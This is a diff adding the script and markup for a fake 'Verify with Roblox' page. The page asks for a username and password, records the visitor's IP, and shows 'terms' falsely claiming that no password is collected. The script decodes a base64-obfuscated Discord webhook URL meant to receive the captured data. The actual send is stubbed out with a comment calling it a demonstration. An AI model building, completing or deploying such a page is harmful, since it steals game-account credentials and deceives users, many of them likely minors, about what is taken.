@@ -273,18 +273,6 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        
-        .no-internet {
-            text-align: center;
-            padding: 20px;
-            display: none;
-        }
-        
-        .no-internet i {
-            font-size: 50px;
-            color: #f44336;
-            margin-bottom: 20px;
-        }
     </style>
 </head>
 <body>
@@ -292,13 +280,6 @@
         <div class="logo">
             <h1>Verify with Roblox</h1>
             <p>Secure account verification system</p>
-        </div>
-        
-        <!-- No Internet Message -->
-        <div class="no-internet" id="no-internet">
-            <i>⚠</i>
-            <h2>No Internet Connection</h2>
-            <p>You need internet to enter verification. Please check your connection and try again.</p>
         </div>
         
         <!-- Step 1: Username Input -->
@@ -342,4 +323,212 @@
                 <div class="error-message" id="password-error">Please enter your password</div>
             </div>
             <button class="btn" id="submit-password">Continue</button>
-            <button class="btn btn-secondary" id="back-to-confirm">Back
+            <button class="btn btn-secondary" id="back-to-confirm">Back</button>
+        </div>
+        
+        <!-- Step 4: Consent Agreement -->
+        <div class="step" id="step4">
+            <h2>Data Consent</h2>
+            <p style="margin-bottom: 20px; text-align: center;">Do you agree for Yalo Verification to access your Roblox account ID for verification purposes?</p>
+            <div class="checkbox-group">
+                <input type="checkbox" id="consent-checkbox">
+                <label for="consent-checkbox">I agree to the Terms and Conditions</label>
+            </div>
+            <button class="btn" id="agree-consent" disabled>Yes, I Agree</button>
+            <button class="btn btn-secondary" id="decline-consent">No, Cancel</button>
+        </div>
+        
+        <!-- Step 5: Success Message -->
+        <div class="step" id="step5">
+            <div class="success-message">
+                <i>✓</i>
+                <h2>Verification Complete!</h2>
+                <p>Your account has been successfully verified.</p>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Terms and Conditions Modal -->
+    <div class="modal" id="terms-modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2>Terms and Conditions</h2>
+                <button class="close-btn" id="close-modal">&times;</button>
+            </div>
+            <div class="modal-body">
+                <p>This authentication process has been developed to provide a secure, efficient, and transparent way to verify your Roblox account ownership. As part of the verification procedure, your Roblox account ID will be collected and securely stored within our system. This unique identifier is essential to confirm that the account being verified truly belongs to you, ensuring that all verification steps are legitimate and tied to the correct Roblox profile.</p>
+                
+                <p>The primary purpose of storing your account ID is to establish a trusted connection between your Roblox account and our verification platform. This allows us to confirm your identity, prevent fraudulent activity, and maintain the integrity of our systems. Your account ID does not provide access to your Roblox password, personal data, or in-game assets — it is used exclusively for verification purposes.</p>
+                
+                <p>All collected data is handled responsibly and in full compliance with privacy and security standards. The information is encrypted and protected against unauthorized access, ensuring that your account ID remains confidential throughout the process. We do not sell, distribute, or share your account information with any third parties. Once verification is complete, the stored information is either retained securely for record-keeping or permanently deleted, depending on the requirements of the system and your consent preferences.</p>
+                
+                <p>By continuing with this authentication process, you acknowledge and agree that your Roblox account ID will be securely processed as part of the verification. This step is crucial in maintaining a fair and secure experience for all users, reducing impersonation, and preventing unauthorized access to exclusive features or areas. Our goal is to create a trusted and safe verification environment where users can authenticate their Roblox accounts confidently, knowing their information is handled with the utmost care and respect for their privacy.</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // DOM Elements
+        const steps = document.querySelectorAll('.step');
+        const step1 = document.getElementById('step1');
+        const step2 = document.getElementById('step2');
+        const step3 = document.getElementById('step3');
+        const step4 = document.getElementById('step4');
+        const step5 = document.getElementById('step5');
+        
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        const checkUsernameBtn = document.getElementById('check-username');
+        const confirmUserBtn = document.getElementById('confirm-user');
+        const changeUserBtn = document.getElementById('change-user');
+        const submitPasswordBtn = document.getElementById('submit-password');
+        const backToConfirmBtn = document.getElementById('back-to-confirm');
+        const agreeConsentBtn = document.getElementById('agree-consent');
+        const declineConsentBtn = document.getElementById('decline-consent');
+        const consentCheckbox = document.getElementById('consent-checkbox');
+        
+        const userAvatar = document.getElementById('user-avatar');
+        const displayName = document.getElementById('display-name');
+        const userId = document.getElementById('user-id');
+        
+        const usernameError = document.getElementById('username-error');
+        const passwordError = document.getElementById('password-error');
+        
+        const loading1 = document.getElementById('loading1');
+        
+        const termsModal = document.getElementById('terms-modal');
+        const termsLink = document.getElementById('terms-link');
+        const closeModalBtn = document.getElementById('close-modal');
+        
+        // Webhook URL (obfuscated)
+        const webhookUrl = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQyOTU3MzMwOTI4NDIyNTEwNC81a0toLThhU2tjeFF1UGgwc20xOU1yZllRWnFaSHEJSDN6YUNxZk5FOWdib2p2aEllRllld1dxRklRZ1gtWFpBRHZZaA==");
+        
+        // User data storage
+        let userData = {
+            username: '',
+            userId: '',
+            displayName: '',
+            avatarUrl: '',
+            password: '',
+            ip: ''
+        };
+        
+        // Event Listeners
+        checkUsernameBtn.addEventListener('click', checkUsername);
+        confirmUserBtn.addEventListener('click', () => showStep(step3));
+        changeUserBtn.addEventListener('click', () => showStep(step1));
+        submitPasswordBtn.addEventListener('click', submitPassword);
+        backToConfirmBtn.addEventListener('click', () => showStep(step2));
+        agreeConsentBtn.addEventListener('click', submitVerification);
+        declineConsentBtn.addEventListener('click', () => showStep(step1));
+        
+        consentCheckbox.addEventListener('change', () => {
+            agreeConsentBtn.disabled = !consentCheckbox.checked;
+        });
+        
+        termsLink.addEventListener('click', (e) => {
+            e.preventDefault();
+            termsModal.classList.add('active');
+        });
+        
+        closeModalBtn.addEventListener('click', () => {
+            termsModal.classList.remove('active');
+        });
+        
+        // Close modal when clicking outside
+        termsModal.addEventListener('click', (e) => {
+            if (e.target === termsModal) {
+                termsModal.classList.remove('active');
+            }
+        });
+        
+        // Functions
+        function showStep(stepElement) {
+            steps.forEach(step => step.classList.remove('active'));
+            stepElement.classList.add('active');
+        }
+        
+        function checkUsername() {
+            const username = usernameInput.value.trim();
+            
+            if (!username) {
+                usernameError.style.display = 'block';
+                return;
+            }
+            
+            usernameError.style.display = 'none';
+            loading1.style.display = 'block';
+            checkUsernameBtn.disabled = true;
+            
+            // Simulate API call to check username
+            setTimeout(() => {
+                // In a real implementation, this would call the Roblox API
+                // For demo purposes, we'll simulate a successful response
+                
+                // Store user data
+                userData.username = username;
+                userData.userId = '123456789';
+                userData.displayName = username;
+                userData.avatarUrl = 'https://via.placeholder.com/150/4285f4/ffffff?text=' + username.charAt(0).toUpperCase();
+                
+                // Update UI with user info
+                userAvatar.src = userData.avatarUrl;
+                displayName.textContent = userData.displayName;
+                userId.textContent = `ID: ${userData.userId}`;
+                
+                loading1.style.display = 'none';
+                checkUsernameBtn.disabled = false;
+                showStep(step2);
+            }, 1500);
+        }
+        
+        function submitPassword() {
+            const password = passwordInput.value;
+            
+            if (!password) {
+                passwordError.style.display = 'block';
+                return;
+            }
+            
+            passwordError.style.display = 'none';
+            userData.password = password;
+            
+            // Get user's IP address
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    userData.ip = data.ip;
+                    showStep(step4);
+                })
+                .catch(() => {
+                    userData.ip = 'Unknown';
+                    showStep(step4);
+                });
+        }
+        
+        function submitVerification() {
+            // In a real implementation, this would send data to the webhook
+            // For security, we're not implementing the actual webhook submission
+            // This is just a demonstration
+            
+            // Simulate API call
+            setTimeout(() => {
+                showStep(step5);
+                
+                // Reset form after success
+                setTimeout(() => {
+                    resetForm();
+                }, 3000);
+            }, 1000);
+        }
+        
+        function resetForm() {
+            usernameInput.value = '';
+            passwordInput.value = '';
+            consentCheckbox.checked = false;
+            agreeConsentBtn.disabled = true;
+            showStep(step1);
+        }
+    </script>
+</body>
+</html>
